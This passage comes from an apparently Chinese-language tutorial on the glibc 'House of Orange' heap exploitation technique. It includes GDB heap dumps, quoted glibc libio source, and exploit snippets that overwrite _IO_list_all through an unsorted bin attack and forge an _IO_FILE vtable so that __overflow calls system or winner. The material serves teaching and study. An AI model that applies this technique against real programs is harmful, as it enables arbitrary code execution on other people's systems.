class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>我们看下此时 heap 的情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/4gx p1-0x10+0x400</span><br><span class="line">0x602400:0x00000000000000000x0000000000000be1     &lt;--- old top chunk</span><br><span class="line">0x602410:0x00007ffff7dd1b580x00007ffff7dd1b58</span><br><span class="line">PwnLife&gt; x/4gx p1-0x10+0x400+0xbe0</span><br><span class="line">0x602fe0:0x0000000000000be00x0000000000000010     &lt;----  fencepost chunk 1</span><br><span class="line">0x602ff0:0x00000000000000000x0000000000000011     &lt;----  fencepost chunk 2</span><br><span class="line">PwnLife&gt; x/4gx p2-0x10</span><br><span class="line">0x623000:0x00000000000000000x0000000000001011     &lt;----  chunk p2 </span><br><span class="line">0x623010:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; x/4gx p2-0x10+0x1010</span><br><span class="line">0x624010:0x00000000000000000x0000000000020ff1     &lt;---- new top chunk</span><br><span class="line">0x624020:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602400 ◂— 0x7ffff7dd1b58</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>另外可以看到 old top chunk 被缩小了 0x20，缩小的空间被用于放置 fencepost chunk。</p><p>根据放入 unsorted bin 中 old top chunk 的 fd/bk 指针，可以推算出 <code>_IO_list_all</code> 的地址。然后通过溢出将 old top 的 bk 改写为 <code>_IO_list_all-0x10</code>，这样在进行 unsorted bin attack 时，就会将 <code>_IO_list_all</code> 修改为 <code>&amp;unsorted_bin-0x10</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602400</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>,</span><br><span class="line">  size = <span class="number">3041</span>,</span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  bk = <span class="number">0x7ffff7dd24f0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/<span class="number">20</span>gx <span class="number">0x7ffff7dd24f0</span></span><br><span class="line"><span class="number">0x7ffff7dd24f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2500</span> &lt;_IO_list_all&gt;:<span class="number">0x00007ffff7dd2520</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2510</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2520</span> &lt;_IO_2_1_stderr_&gt;:<span class="number">0x00000000fbad2887</span><span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2530</span> &lt;_IO_2_1_stderr_+<span class="number">16</span>&gt;:<span class="number">0x00007ffff7dd25a3</span><span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2540</span> &lt;_IO_2_1_stderr_+<span class="number">32</span>&gt;:<span class="number">0x00007ffff7dd25a3</span><span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2550</span> &lt;_IO_2_1_stderr_+<span class="number">48</span>&gt;:<span class="number">0x00007ffff7dd25a3</span><span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2560</span> &lt;_IO_2_1_stderr_+<span class="number">64</span>&gt;:<span class="number">0x00007ffff7dd25a4</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2570</span> &lt;_IO_2_1_stderr_+<span class="number">80</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2580</span> &lt;_IO_2_1_stderr_+<span class="number">96</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd2600</span></span><br></pre></td></tr></table></figure><p>这里，会顺便涉及到  glibc 的异常处理.</p><p>一般在出现内存错误时，会调用函数 <code>malloc_printerr()</code> 打印出错信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当调用  <code>__libc_message</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sysdeps/posix/libc_fatal.c</span></span><br><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Kill the application.  */</span></span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>do_abort</code> 调用 <code>fflush</code>，即 <code>_IO_flush_all_lockp</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdlib/abort.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;   <span class="comment">// 将其覆盖</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     <span class="comment">// 将其修改为 system 函数</span></span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">      fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      last_stamp = _IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp = fp-&gt;_chain;    <span class="comment">// 指向我们指定的区域</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_list_all</code> 是一个 <code>_IO_FILE_plus</code> 类型的对象，我们的目的就是将 <code>_IO_list_all</code> 指针改写为一个伪造的指针，它的 <code>_IO_OVERFLOW</code> 指向 system，并且前 8 字节被设置为 ‘/bin/sh’，所以对 <code>_IO_OVERFLOW(fp, EOF)</code> 的调用最终会变成对 <code>system(&#39;/bin/sh&#39;)</code> 的调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio/libio.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中有一个指向函数跳转表的指针，<code>_IO_jump_t</code> 的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>伪造 <code>_IO_jump_t</code> 中的 <code>__overflow</code> 为 system 函数的地址，从而达到执行 shell 的目的。</p><p>当发生内存错误进入 <code>_IO_flush_all_lockp</code> 后，<code>_IO_list_all</code> 仍然指向 unsorted bin，这并不是一个我们能控制的地址。所以需要通过 <code>fp-&gt;_chain</code> 来将 fp 指向我们能控制的地方。所以将 size 字段设置为 0x61，因为此时 <code>_IO_list_all</code> 是 <code>&amp;unsorted_bin-0x10</code>，偏移 0x60 位置上是 smallbins[5]。此时，如果触发一个不适合的 small chunk 分配，malloc 就会将 old top 从 unsorted bin 放回 smallbins[5] 中。而在 <code>_IO_FILE</code> 结构中，偏移 0x60 指向 <code>struct _IO_marker *_markers</code>，偏移 0x68 指向 <code>struct _IO_FILE *_chain</code>，这两个值正好是 old top 的起始地址。这样 fp 就指向了 old top，这是一个我们能够控制的地址。</p><p>在将 <code>_IO_OVERFLOW</code> 修改为 system 的时候，有一些条件检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     <span class="comment">// 需要修改为 system 函数</span></span><br><span class="line"><span class="comment">// libio/libio.h</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以这里我们设置 <code>fp-&gt;_mode = 0</code>，<code>fp-&gt;_IO_write_base = (char *) 2</code> 和 <code>fp-&gt;_IO_write_ptr = (char *) 3</code>，从而绕过检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br></pre></td></tr></table></figure><p>然后，就是修改 <code>_IO_jump_t</code>，将其指向 winner：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">248</span>     <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line"><span class="number">249</span>     jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line"><span class="number">250</span>     *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// 